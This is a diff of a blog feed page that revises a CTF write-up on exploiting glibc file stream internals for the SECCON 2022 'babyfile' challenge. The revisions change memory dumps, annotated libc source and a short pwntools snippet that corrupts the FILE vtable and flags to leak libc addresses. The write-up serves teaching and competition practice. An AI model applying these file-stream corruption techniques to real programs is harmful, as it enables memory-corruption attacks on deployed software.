@@ -8,7 +8,7 @@
     
             <link href="https://nasm.re/tags/nasm/" rel="alternate" type="text/html" title="HTML" />
             <link href="https://nasm.re/tags/nasm/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
-    <updated>2022-11-19T23:56:27+01:00</updated>
+    <updated>2022-11-24T14:46:31+01:00</updated>
     
         <author>
             <name>nasm</name>
@@ -45,7 +45,7 @@
   href="https://github.com/ret2school/ctf/tree/master/2022/seccon/pwn/babyfile"
   
   >here</a
->. If you&rsquo;re not familiar with file stream internals, I advice you to read my previous writeups about file stream exploitation, espacially <a
+>. If you&rsquo;re not familiar with file stream internals, I advice you to read my previous writeups about file stream exploitation, especially <a
   class="gblog-markdown__link"
   href="../catastrophe"
   
@@ -227,21 +227,21 @@
 </div>
 <p>To get a libc leak we have to write on stdout a certain amount of bytes that leak a libc address. To do so we&rsquo;re looking for a way to make interesting pointers appear as the base buffer to then initialize both input and output buffer to the base buffer and then do a partial overwrite on these fields to point to an area that contains libc pointers. To get heap addresses within the base buffer we can misalign the vtable in such a way that <code>fp-&gt;vtable-&gt;sync()</code> calls <code>_IO_default_doallocate</code>. Then <code>_IO_default_doallocate</code> is called and does some operations:</p>
 <p>The initial state of the file stream looks like this:</p>
-<pre tabindex="0"><code>0x5649e80772a0: 0x00000000fbad2488      0x0000000000000000
-0x5649e80772b0: 0x0000000000000000      0x0000000000000000
-0x5649e80772c0: 0x0000000000000000      0x0000000000000000
-0x5649e80772d0: 0x0000000000000000      0x0000000000000000
-0x5649e80772e0: 0x0000000000000000      0x0000000000000000
-0x5649e80772f0: 0x0000000000000000      0x0000000000000000
-0x5649e8077300: 0x0000000000000000      0x00007f4092dc85c0
-0x5649e8077310: 0x0000000000000003      0x0000000000000000
-0x5649e8077320: 0x0000000000000000      0x00005649e8077380
-0x5649e8077330: 0xffffffffffffffff      0x0000000000000000
-0x5649e8077340: 0x00005649e8077390      0x0000000000000000
-0x5649e8077350: 0x0000000000000000      0x0000000000000000
-0x5649e8077360: 0x0000000000000000      0x0000000000000000
-0x5649e8077370: 0x0000000000000000      0x00007f4092dc44a0
-0x5649e8077380: 0x0000000000000000      0x0000000000000000
+<pre tabindex="0"><code>0x559c0955e2a0: 0x00000000fbad2488      0x0000000000000000
+0x559c0955e2b0: 0x0000000000000000      0x0000000000000000
+0x559c0955e2c0: 0x0000000000000000      0x0000000000000000
+0x559c0955e2d0: 0x0000000000000000      0x0000000000000000
+0x559c0955e2e0: 0x0000000000000000      0x0000000000000000
+0x559c0955e2f0: 0x0000000000000000      0x0000000000000000
+0x559c0955e300: 0x0000000000000000      0x00007f99db7c05c0
+0x559c0955e310: 0x0000000000000003      0x0000000000000000
+0x559c0955e320: 0x0000000000000000      0x0000559c0955e380
+0x559c0955e330: 0xffffffffffffffff      0x0000000000000000
+0x559c0955e340: 0x0000000000000000      0x0000000000000000
+0x559c0955e350: 0x0000000000000000      0x0000000000000000
+0x559c0955e360: 0x0000000000000000      0x0000000000000000
+0x559c0955e370: 0x0000000000000000      0x00007f99db7bc4a8
+0x559c0955e380: 0x0000000100000001      0x00007f99db7c6580
 </code></pre><p>It initializes the base buffer to a fresh <code>BUFSIZE</code> allocated buffer.
 
 <div class="gblog-expand">
@@ -269,27 +269,27 @@
 </p>
 
 <div class="gblog-expand">
-  <label class="gblog-expand__head flex justify-between" for="9a2bb157-7">
+  <label class="gblog-expand__head flex justify-between" for="44ea7947-7">
     <span>fp state after the _IO_default_doallocate</span>
     <span>...</span>
   </label>
-  <input id="9a2bb157-7" type="checkbox" class="gblog-expand__control hidden" />
+  <input id="44ea7947-7" type="checkbox" class="gblog-expand__control hidden" />
   <div class="gblog-markdown--nested gblog-expand__content">
-    <pre tabindex="0"><code>0x5649e80772a0: 0x00000000fbad2488      0x0000000000000000
-0x5649e80772b0: 0x0000000000000000      0x0000000000000000
-0x5649e80772c0: 0x0000000000000000      0x0000000000000000
-0x5649e80772d0: 0x0000000000000000      0x00005649e8077480
-0x5649e80772e0: 0x00005649e8079480      0x0000000000000000
-0x5649e80772f0: 0x0000000000000000      0x0000000000000000
-0x5649e8077300: 0x0000000000000000      0x00007f4092dc85c0
-0x5649e8077310: 0x0000000000000003      0x0000000000000000
-0x5649e8077320: 0x0000000000000000      0x00005649e8077380
-0x5649e8077330: 0xffffffffffffffff      0x0000000000000000
-0x5649e8077340: 0x0000000000000000      0x0000000000000000
-0x5649e8077350: 0x0000000000000000      0x0000000000000000
-0x5649e8077360: 0x0000000000000000      0x0000000000000000
-0x5649e8077370: 0x0000000000000000      0x00007f4092dc4460
-0x5649e8077380: 0x0000000000000000      0x0000000000000000
+    <pre tabindex="0"><code>0x559c0955e2a0: 0x00000000fbad2488      0x0000000000000000
+0x559c0955e2b0: 0x0000000000000000      0x0000000000000000
+0x559c0955e2c0: 0x0000000000000000      0x0000000000000000
+0x559c0955e2d0: 0x0000000000000000      0x0000559c0955e480
+0x559c0955e2e0: 0x0000559c09560480      0x0000000000000000
+0x559c0955e2f0: 0x0000000000000000      0x0000000000000000
+0x559c0955e300: 0x0000000000000000      0x00007f99db7c05c0
+0x559c0955e310: 0x0000000000000003      0x0000000000000000
+0x559c0955e320: 0x0000000000000000      0x0000559c0955e380
+0x559c0955e330: 0xffffffffffffffff      0x0000000000000000
+0x559c0955e340: 0x0000000000000000      0x0000000000000000
+0x559c0955e350: 0x0000000000000000      0x0000000000000000
+0x559c0955e360: 0x0000000000000000      0x0000000000000000
+0x559c0955e370: 0x0000000000000000      0x00007f99db7bc4a8
+0x559c0955e380: 0x0000000100000001      0x00007f99db7c6580
 </code></pre>
   </div>
 </div>
@@ -394,11 +394,11 @@ Given the input / output buffer are <code>NULL</code> and that <code>fp-&gt;flag
 </p>
 
 <div class="gblog-expand">
-  <label class="gblog-expand__head flex justify-between" for="a0517a8d-9">
+  <label class="gblog-expand__head flex justify-between" for="efa9389a-9">
     <span>_IO_default_pbackfail</span>
     <span>...</span>
   </label>
-  <input id="a0517a8d-9" type="checkbox" class="gblog-expand__control hidden" />
+  <input id="efa9389a-9" type="checkbox" class="gblog-expand__control hidden" />
   <div class="gblog-markdown--nested gblog-expand__content">
     <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span>
 <span class="nf">_IO_default_pbackfail</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">int</span> <span class="n">c</span><span class="p">)</span>
@@ -420,7 +420,8 @@ Given the input / output buffer are <code>NULL</code> and that <code>fp-&gt;flag
 	    <span class="p">}</span>
 	  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">_IO_have_backup</span> <span class="p">(</span><span class="n">fp</span><span class="p">))</span>
 	    <span class="p">{</span>
-	      <span class="cm">/* No backup buffer: allocate one. */</span>
+        <span class="c1">// !! We should take this path cuz there is no save buffer plus we do not have the backup flag
+</span><span class="c1"></span>	      <span class="cm">/* No backup buffer: allocate one. */</span>
 	      <span class="cm">/* Use nshort buffer, if unused? (probably not)  FIXME */</span>
 	      <span class="kt">int</span> <span class="n">backup_size</span> <span class="o">=</span> <span class="mi">128</span><span class="p">;</span>
 	      <span class="kt">char</span> <span class="o">*</span><span class="n">bbuf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">malloc</span> <span class="p">(</span><span class="n">backup_size</span><span class="p">);</span>
@@ -442,10 +443,6 @@ Given the input / output buffer are <code>NULL</code> and that <code>fp-&gt;flag
 	  <span class="n">new_size</span> <span class="o">=</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">old_size</span><span class="p">;</span>
 	  <span class="n">new_buf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">malloc</span> <span class="p">(</span><span class="n">new_size</span><span class="p">);</span>
 	  <span class="k">if</span> <span class="p">(</span><span class="n">new_buf</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
-            <span class="cm">/* we should return there 
-</span><span class="cm">            (fp-&gt;_IO_read_end == fp-&gt;_IO_read_base), 
-</span><span class="cm">            new_size == 0, new_buf == NULL.
-</span><span class="cm">            */</span>
             <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
 	  <span class="n">memcpy</span> <span class="p">(</span><span class="n">new_buf</span> <span class="o">+</span> <span class="p">(</span><span class="n">new_size</span> <span class="o">-</span> <span class="n">old_size</span><span class="p">),</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span><span class="p">,</span>
 		  <span class="n">old_size</span><span class="p">);</span>
@@ -466,27 +463,27 @@ Given the input / output buffer are <code>NULL</code> and that <code>fp-&gt;flag
 
 
 <div class="gblog-expand">
-  <label class="gblog-expand__head flex justify-between" for="c19e7e1e-10">
+  <label class="gblog-expand__head flex justify-between" for="428219e4-10">
     <span>fp state after the _IO_new_file_underflow</span>
     <span>...</span>
   </label>
-  <input id="c19e7e1e-10" type="checkbox" class="gblog-expand__control hidden" />
+  <input id="428219e4-10" type="checkbox" class="gblog-expand__control hidden" />
   <div class="gblog-markdown--nested gblog-expand__content">
-    <pre tabindex="0"><code>0x5649e80772a0: 0x00000000fbad9888      0x00005649e8077480
-0x5649e80772b0: 0x00005649e8077480      0x00005649e8077480
-0x5649e80772c0: 0x00005649e8077480      0x00005649e8077480
-0x5649e80772d0: 0x00005649e8079480      0x00005649e8077480
-0x5649e80772e0: 0x00005649e8079480      0x00005649e8077480
-0x5649e80772f0: 0x00005649e8079510      0x00005649e8077480
-0x5649e8077300: 0x0000000000000000      0x00007f4092dc85c0
-0x5649e8077310: 0x0000000000000001      0x0000000000000000
-0x5649e8077320: 0x0000000000000000      0x00005649e8077380
-0x5649e8077330: 0xffffffffffffffff      0x0000000000000000
-0x5649e8077340: 0x0000000000000000      0x0000000000000000
-0x5649e8077350: 0x0000000000000000      0x0000000000000000
-0x5649e8077360: 0x0000000000000000      0x0000000000000000
-0x5649e8077370: 0x0000000000000000      0x00007f4092dc44a0
-0x5649e8077380: 0x0000000000000000      0x0000000000000000
+    <pre tabindex="0"><code>0x559c0955e2a0: 0x00000000fbad2588      0x0000559c0956050f
+0x559c0955e2b0: 0x0000559c09560590      0x0000559c09560490
+0x559c0955e2c0: 0x0000559c0955e480      0x0000559c0955e480
+0x559c0955e2d0: 0x0000559c0955e480      0x0000559c0955e480
+0x559c0955e2e0: 0x0000559c09560480      0x0000559c0955e480
+0x559c0955e2f0: 0x0000559c09560510      0x0000559c0955e480
+0x559c0955e300: 0x0000000000000000      0x00007f99db7c05c0
+0x559c0955e310: 0x0000000000000003      0x0000000000000000
+0x559c0955e320: 0x0000000000000000      0x0000559c0955e380
+0x559c0955e330: 0xffffffffffffffff      0x0000000000000000
+0x559c0955e340: 0x0000000000000000      0x0000000000000000
+0x559c0955e350: 0x0000000000000000      0x0000000000000000
+0x559c0955e360: 0x0000000000000000      0x0000000000000000
+0x559c0955e370: 0x0000000000000000      0x00007f99db7bc460
+0x559c0955e380: 0x0000000100000001      0x00007f99db7c6580
 </code></pre>
   </div>
 </div>
@@ -658,7 +655,7 @@ Given the input / output buffer are <code>NULL</code> and that <code>fp-&gt;flag
   </div>
 </div>
 
-<p><strong>Note</strong>: Given <code>fp-&gt;_IO_read_end != fp-&gt;_IO_write_base</code>, <code>fp-&gt;_IO_read_end</code> is equal to <code>_IO_buf_base</code> and that <code>_IO_write_base</code> contains the target memory area, we have to include the <code>_IO_IS_APPENDING</code> flag into <code>fp-&gt;_flags</code> to avoid the <code>_IO_SYSSEEK</code> which would fail and then return. Therefore we can finally reach the <code>_IO_SYSWRITE</code> that will leak the libc pointer.</p>
+<p><strong>Note</strong>: Given <code>fp-&gt;_IO_read_end != fp-&gt;_IO_write_base</code>, <code>fp-&gt;_IO_read_end</code> is the save buffer that has been allocated and switched in <code>_IO_default_pbackfail</code> and that <code>_IO_write_base</code> contains the target memory area, we have to include the <code>_IO_IS_APPENDING</code> flag into <code>fp-&gt;_flags</code> to avoid the <code>_IO_SYSSEEK</code> which would fail and then return. Therefore we can finally reach the <code>_IO_SYSWRITE</code> that will leak the libc pointer.</p>
 <p>The leak phase gives for me something like this:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="c1"># do_allocate</span>
 <span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0xa8</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">vtable</span><span class="p">)</span>
@@ -667,15 +664,6 @@ Given the input / output buffer are <code>NULL</code> and that <code>fp-&gt;flag
 <span class="c1"># _IO_file_underflow =&gt; _IO_default_pbackfail</span>
 <span class="n">partial_write</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p8</span><span class="p">(</span><span class="mh">0x60</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">vtable</span><span class="p">)</span>
 <span class="n">fflush</span><span class="p">()</span>
-
-<span class="s2">&#34;&#34;&#34;
-</span><span class="s2">int
-</span><span class="s2">_IO_default_pbackfail (FILE *fp, int c)
-</span><span class="s2">=&gt; not _IO_IN_BACKUP         0x0100
-</span><span class="s2">=&gt; _IO_read_base == _IO_write_ptr
-</span><span class="s2">=&gt; _IO_read_end == _IO_write_ptr + 8
-</span><span class="s2">=&gt; _IO_write_end = right size
-</span><span class="s2">&#34;&#34;&#34;</span>
 
 <span class="n">write_ptr</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span> <span class="o">|</span> <span class="mh">0x8000</span><span class="p">),</span> <span class="n">File</span><span class="o">.</span><span class="n">flags</span><span class="p">)</span>
 
